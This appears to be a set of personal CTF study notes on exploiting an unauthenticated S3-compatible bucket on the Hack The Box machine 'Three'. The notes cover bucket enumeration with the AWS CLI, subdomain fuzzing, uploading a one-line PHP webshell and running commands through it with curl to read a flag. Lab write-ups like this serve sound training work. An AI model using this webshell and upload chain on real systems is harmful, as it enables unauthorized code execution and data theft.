---
tags: [aws, web]
---

> **AWS S3** (Simple Storage Service) is Amazon's object storage. Misconfigured S3-compatible endpoints — like those found in HTB — allow unauthenticated access to buckets, enabling file listing, download, and upload. This guide covers what we've practiced.

---

## Quickstart — Enumerate & Exploit

```bash
# 1. Configure fake credentials (the endpoint doesn't validate them)
$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp

# 2. List all buckets
$ aws --endpoint=http://s3.thetoppers.htb s3 ls

# 3. List contents of a specific bucket
$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

# 4. Upload a file to the bucket
$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

# 5. Verify upload
$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

---

## The Misconfiguration

Some HTB machines run **S3-compatible storage services** (not real AWS) that:

- Don't validate AWS credentials — any `access key` / `secret key` pair works
- Expose the endpoint on a subdomain (e.g., `s3.domain.htb`)
- Allow anonymous listing, reading, and writing to buckets

> 💡 The `--endpoint` flag redirects the AWS CLI to a custom server instead of Amazon's real S3. Combined with fake credentials, this lets you interact with self-hosted S3-compatible storage as if you were authenticated.

---

## Core Commands

| Command | What it does |
| :------ | :----------- |
| `aws configure` | Set up fake credentials (interactive) |
| `aws --endpoint=<url> s3 ls` | List all buckets |
| `aws --endpoint=<url> s3 ls s3://<bucket>` | List bucket contents |
| `aws --endpoint=<url> s3 cp <local> s3://<bucket>/<remote>` | Upload a file |
| `aws --endpoint=<url> s3 cp s3://<bucket>/<file> <local>` | Download a file |

---

## Attack Chain — From Subdomain to Shell

### Step 1 — Discover the S3 endpoint

Subdomain fuzzing reveals `s3.domain.htb`:

```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.thetoppers.htb -ac

s3.thetoppers.htb    [Status: 404, Size: 21]
```

Add it to `/etc/hosts`:

```bash
$ echo "10.129.X.X s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Step 2 — Enumerate the bucket

```bash
$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-07 11:57:24          0 .htaccess
2026-06-07 11:57:24      11952 index.php
```

The bucket contains the website's source code — `index.php` is the same file served by the main site. This means the S3 bucket is the **backend storage** for the web server.

### Step 3 — Upload a webshell

```bash
$ echo '<?php system($_GET["cmd"]); ?>' > file.php
$ aws --endpoint=http://s3.thetoppers.htb s3 cp file.php s3://thetoppers.htb
upload: ./file.php to s3://thetoppers.htb/file.php
```

### Step 4 — Execute commands

The uploaded PHP file is now accessible via the main website:

```bash
$ curl 'http://thetoppers.htb/file.php?cmd=whoami'
www-data

$ curl 'http://thetoppers.htb/file.php?cmd=ls%20..'
flag.txt
html

$ curl 'http://thetoppers.htb/file.php?cmd=cat%20../flag.txt'
a980d99281a28d638ac68b9bf9453c2b
```

> 💡 **Why this works:** The S3 bucket serves as the web root for the main site. Any file uploaded to the bucket becomes immediately accessible via `http://domain.htb/<filename>`. This is a deliberate misconfiguration — the bucket should be read-only or require authentication for writes, but anonymous upload is enabled.

---

## Troubleshooting

| Error / Symptom | Likely cause |
| :-------------- | :------------- |
| `aws: command not found` | Install AWS CLI: `sudo apt install awscli` |
| `Could not connect to endpoint` | S3 subdomain not in `/etc/hosts` |
| `AccessDenied` | Bucket has auth enabled — try different fake credentials |
| Uploaded file returns 404 on main site | Bucket may not be the web root, or file needs `.php` extension |

---

## 🔗 Related

**Machines:** [[🥉 Three]]

**Guides:** [[🎯 ffuf]], [[🐚 PHP Webshell]]

---

## References

- [AWS CLI S3 Commands](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [HackTricks — AWS S3](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-security)
